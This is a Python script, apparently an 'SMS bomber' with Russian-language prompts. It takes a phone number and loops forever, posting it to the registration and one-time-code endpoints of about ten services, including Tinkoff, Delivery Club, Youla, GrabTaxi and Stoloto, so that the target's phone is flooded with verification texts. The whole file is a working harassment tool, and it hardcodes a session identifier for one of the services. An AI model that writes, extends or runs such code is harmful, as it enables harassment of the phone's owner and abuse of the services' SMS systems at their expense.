import requests
import os
import sys
import time

i = 0
phone = input('телефон (без +):')

while True:
    a = time.strftime("%H:%M:%S", time.localtime())

    def ivi():
        time.sleep(1)
        r = requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/',data= {'phone':phone})
        print(a, "IVI: смс отправлено на номер:"+phone)
    ivi()
    def tinkoff ():
        time.sleep(1)
        r = requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=jZSpmBlh57ZaC2PGtgXSK3O93jR311Um.m1-prod-api12&wuid=01e96f12c2be466585c150558a7de6cd&dmpId=5102f430-cf37-4db2-a3c3-49f4663f665d', data={'phone':'+'+phone})
        print(a, "Тинкооф: смс отправлено на номер:"+phone)
    tinkoff()
    def delivery_clab():
        time.sleep(1)
        r = requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone":phone})
        print(a, "Delivery club: смс отправлено на номер:"+phone)
    delivery_clab()
    def grab():
        time.sleep(1)
        r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':phone, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print(a, "GrabTaxi: смс отправлено на номер:"+phone)
    grab()
    def youla():
        time.sleep(1)
        r = requests.post('https://youla.ru/web-api/auth/request_code',data={'phone':phone} )
        print(a, "Юла: смс отправлено на номер:"+phone)
    youla()
    def korona ():
        time.sleep(1)
        r = requests.post('https://koronapay.com/transfers/online/api/users/otps',data={'phone': phone})
        print(a, "Золотая Корона: смс отправлено на номер:"+phone)
    korona()
    def stoloto ():
        time.sleep(1)
        r = requests.post('https://www.stoloto.ru:443/send-mobile-app-link',data={'phone':phone})
        print(a, "Столото: смс отправлено на номер:"+phone)
    stoloto()
    def drugvokrug():
        time.sleep(1)
        r = requests.post('https://drugvokrug.ru:443/siteActions/processSms.htm',data={'cell':phone})
        print(a, "Другвокруг: смс отправлено на номер:"+phone)
    drugvokrug()
    def belkacar():
        time.sleep(1)
        r = requests.post('https://belkacar.ru:443/get-confirmation-code',data={'phone':phone})
        print(a, "BelkaCar: смс отправлено на номер:"+phone)
    belkacar()
    def dodopizza():
        time.sleep(1)
        r = requests.post('https://dodopizza.ru/api/sendconfirmationcode',data={'phoneNumber':phone})
        print(a, "DodoPizza: смс отправлено на номер:"+phone)
    i += 1
input()